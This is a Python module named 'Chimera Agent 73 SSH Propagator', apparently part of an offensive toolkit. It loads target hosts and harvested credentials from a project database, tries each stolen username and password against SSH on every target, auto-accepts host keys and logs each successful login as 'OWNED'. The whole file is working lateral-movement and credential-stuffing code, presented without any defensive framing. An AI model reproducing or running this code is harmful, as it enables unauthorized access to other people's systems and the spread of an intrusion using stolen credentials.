import os
import sys
import paramiko
import time

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    
    os.system('clear')
    print("\033[94m" + "="*60)
    print("   CHIMERA AGENT 73 :: SSH PROPAGATOR (INTEGRATED)")
    print("="*60 + "\033[0m")

    # Pulling sanitized data from the core DB handler
    targets = db.get_targets()
    loot = db.get_loot()

    if not targets or not loot:
        print("\033[91m[!] No targets or loot found in the Vault. Run 01 and 30 first.\033[0m")
        return

    print(f"[*] Analyzing {len(targets)} targets against {len(loot)} harvested credentials...")

    for target in targets:
        for cred in loot:
            user, password = cred['user'], cred['pass']
            print(f"  [*] Attempting: {user}@{target}...")
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                # 3-second timeout to keep the swarm moving fast
                client.connect(target, username=user, password=password, timeout=3)
                print(f"\033[92m  [!!!] SUCCESS: {user}@{target} is OWNED!\033[0m")
                
                db.report_finding("73_SSH_Propagator", "Lateral_Success", {
                    "target": target,
                    "user": user,
                    "password": password
                })
                client.close()
            except Exception:
                continue

    print("\n[*] Propagation cycle complete.")
    db.close()

if __name__ == "__main__":
    run()
